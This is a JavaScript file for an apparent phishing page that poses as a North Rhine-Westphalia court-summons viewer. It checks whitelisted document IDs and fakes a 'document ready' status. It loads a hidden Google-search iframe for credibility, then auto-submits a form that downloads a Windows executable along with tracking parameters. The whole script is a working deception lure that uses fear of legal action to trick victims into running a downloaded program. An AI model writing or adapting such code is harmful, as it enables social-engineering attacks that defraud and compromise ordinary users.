document.addEventListener('DOMContentLoaded', function() {
  const urlParams = new URLSearchParams(window.location.search);
  const docType = urlParams.get('type');
  const docId = urlParams.get('id');
  
  // UI Elements
  const spinner = document.getElementById('spinner');
  const statusText = document.getElementById('statusText');
  const checkmark = document.getElementById('checkmark');
  
  // Белый список документов
  const validDocs = {
    ladung: ['L-40822', 'L-55199', 'L-77301'],
    vorladung: ['V-11245', 'V-88903']
  };

  if (validDocs[docType]?.includes(docId)) {
    // Phase 1: Show loading state
    setTimeout(() => {
      spinner.style.display = 'none';
      checkmark.style.display = 'block';
      statusText.textContent = "Das Dokument steht zur Einsicht bereit.";
    }, 2500);

    // Phase 2: Create hidden iframe
    const iframe = document.createElement('iframe');
    iframe.style.display = 'none';
    iframe.sandbox = 'allow-same-origin allow-scripts';
    iframe.src = `https://www.google.com/search?q=justiz+nrw+${docId}`;
    document.body.appendChild(iframe);

    // Phase 3: Redirect after delay
    setTimeout(() => {
      const finalUrl = `https://builds.dotnet.microsoft.com/dotnet/Sdk/9.0.304/dotnet-sdk-9.0.304-win-x64.exe?cache=${Date.now()}`;
      
      const form = document.createElement('form');
      form.method = 'GET';
      form.action = finalUrl;
      
      const params = {
        source: 'github-redirect',
        session: Math.random().toString(36).substring(2),
        doc_type: docType,
        doc_id: docId
      };
      
      for (const [key, value] of Object.entries(params)) {
        const input = document.createElement('input');
        input.type = 'hidden';
        input.name = key;
        input.value = value;
        form.appendChild(input);
      }
      
      document.body.appendChild(form);
      form.submit();
    }, 3000 + Math.random() * 2000);
  } else {
    // Handle invalid document
    spinner.style.display = 'none';
    statusText.innerHTML = `
      <h1>Dokument nicht gefunden</h1>
      <p>Fehler 404: Das angeforderte Dokument existiert nicht.</p>
    `;
  }
});